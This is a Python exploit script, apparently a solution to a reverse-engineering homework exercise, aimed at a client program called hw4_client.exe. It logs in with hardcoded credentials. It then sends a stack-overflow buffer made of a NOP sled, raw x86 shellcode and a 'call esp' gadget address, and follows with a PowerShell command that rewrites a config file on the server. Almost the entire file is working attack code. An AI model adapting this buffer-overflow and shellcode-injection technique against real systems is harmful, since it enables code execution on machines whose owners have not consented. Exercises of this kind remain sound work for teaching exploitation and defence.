
import os
import time
import subprocess
from subprocess import PIPE, STDOUT
import sys
from sys import argv
import ctypes
import struct
import utils as gadget_finder
from ctypes import wintypes, windll, POINTER, byref, sizeof, c_char
from ctypes.wintypes import *

from numpy.core import byte

def byte_str_num(input_s,arg_1):
	if arg_1 == 9:
		byte_str = [byte(0)]*(len(input_s)+1)
	else:	
		byte_str = [byte(0)]*(len(input_s)+7)
	j=0
	if arg_1 != 9:
		for j in range (0,6,1):
			if j==0:
				byte_str[j] = byte (arg_1)
			elif j >0 and j<4:
				byte_str[j] = byte (0)
			elif j==4:
				byte_str[j] =  byte(ord('.'))	
			elif j==5:
				byte_str[j] =  byte(ord(';'))
		j += 1			
	
	for i in input_s:
		byte_str[j] =  byte(ord(i))
		j += 1
	byte_str[j] = byte(ord('\n'))
	return byte_str	





archer = "archer"
archer_p = "S43U0SE6NZ4S46S5"
PEEK = "PEEK"




exit_str = "exit" 

PEEK_C ="PEEK ./"

gadget = b"\xFF\xD4"
call_esp_addr = ((gadget_finder.GetGadgetAddress(gadget)))
addr_3 = ((byte(call_esp_addr & 0xff)))
addr_2 = (byte(((call_esp_addr) >>8)& 0xff))
addr_1 = (byte(((call_esp_addr) >>16)& 0xff))
addr_0 = (byte(((call_esp_addr) >>24)& 0xff))

stack_code =[
0x89, 0xE5, 0x83, 0xED, 0x04, 0xB8, 0x87, 0x1E, 0x40, 0x00, 0x50, 0xB8, 0x28, 0xFF, 0x60, 0x00, 0x50, 0xB8, 0x00, 0x80, 0x37, 0x00, 0x50, 0xC7, 0x85, 0xE0, 0xFD, 0xFF, 0xFF, 0x65, 0x78, 0x69, 0x74, 0x8B, 0x45, 0x14, 0x89, 0x45, 0x08, 0xC7, 0x45, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x81, 0xEC, 0xA0, 0x20, 0x00, 0x00, 0x89, 0x04, 0x24, 0x89, 0xE0, 0x83, 0xC0, 0x14, 0x68, 0x00, 0x10, 0x00, 0x00, 0x6A, 0x00, 0x50, 0xB8, 0xBC, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x58, 0x58, 0x58, 0x89, 0xE0, 0x83, 0xC0, 0x14, 0x50, 0x50, 0xC7, 0x04, 0x24, 0x68, 0x61, 0x40, 0x00, 0xB8, 0x9C, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x58, 0x58, 0x89, 0xE0, 0x83, 0xC0, 0x14, 0x50, 0xB8, 0x64, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x83, 0xF8, 0x04, 0x5B, 0x75, 0x1E, 0x6A, 0x04, 0x89, 0xE8, 0x2D, 0x20, 0x02, 0x00, 0x00, 0x50, 0x89, 0xE0, 0x83, 0xC0, 0x1C, 0x50, 0xB8, 0x5C, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x5B, 0x5B, 0x5B, 0x85, 0xC0, 0x74, 0x28, 0xFF, 0x74, 0x24, 0x10, 0xFF, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x10, 0x83, 0xC0, 0x04, 0x50, 0x52, 0xFF, 0x74, 0x24, 0x10, 0xB8, 0x92, 0x18, 0x40, 0x00, 0xFF, 0xD0, 0x58, 0x58, 0x58, 0x58, 0x58, 0xE9, 0x79, 0xFF, 0xFF, 0xFF, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xBA, 0xD1, 0x1D, 0x40, 0x00, 0xFF, 0xE2, 0x90, 0x90, 0x90, 0x90, 0x90
]
end_stack= [addr_3,addr_2,addr_1,addr_0,0xE9, 0x00, 0xFA, 0xFF, 0xFF]
shellcode = [b'\x00']*0x20A2



for i in range (0x1000,0x20A2,1):
	shellcode[i] = byte(0x90)


i =0x0
for j in stack_code:
	shellcode[0x1f00+i] = byte(j)
	i +=0x1

i =0x0
for j in end_stack:
	shellcode[0x2098+i] = byte(j)
	i +=0x1

shellcode[0x2098+i]=b'\n'





put_out_fires= r"(Get-Content -Path C:\Users\idanRaz\RE_HW\generated\server\312179674-204512453\config\attack.config) |ForEach-Object {$_ -Replace 'True', 'False'} |Set-Content -Path  C:\Users\idanRaz\RE_HW\generated\server\312179674-204512453\config\attack.config"
# archer =[ b'\x61',b'\x72',b'\x63',b'\x68',b'\x65',b'\x72',b'\n']
# archerP =[ b'\x38',b'\x44',b'\x31',b'\x58',b'\x56',b'\x59',b'\x42',b'\x5a',b'\x41',b'\x41',b'\x31',b'\x38',b'\x53',b'\x41',b'\x58',b'\x5a',b'\n']
# PEEK = [ b'\x50',b'\x45',b'\x45',b'\x4b',b'\n']



ris = subprocess.Popen('hw4_client.exe',stdin=subprocess.PIPE )

input_t = byte_str_num(archer,9)
for  j in input_t:
	ris.stdin.write(j)
	ris.stdin.flush()
	
input_t = byte_str_num(archer_p,9)
for  j in input_t:
	ris.stdin.write(j)
	ris.stdin.flush()



input_t = byte_str_num(PEEK,9)
for j in input_t:
	ris.stdin.write(j)
	ris.stdin.flush()


for j in shellcode:
	ris.stdin.write(j)
	ris.stdin.flush()




input_t = byte_str_num(put_out_fires,7)
for j in input_t:
	ris.stdin.write(j)
	ris.stdin.flush()
	

	

input_t = byte_str_num(exit_str,9)
for j in input_t:
	ris.stdin.write(j)
	ris.stdin.flush()


	

ris.wait()

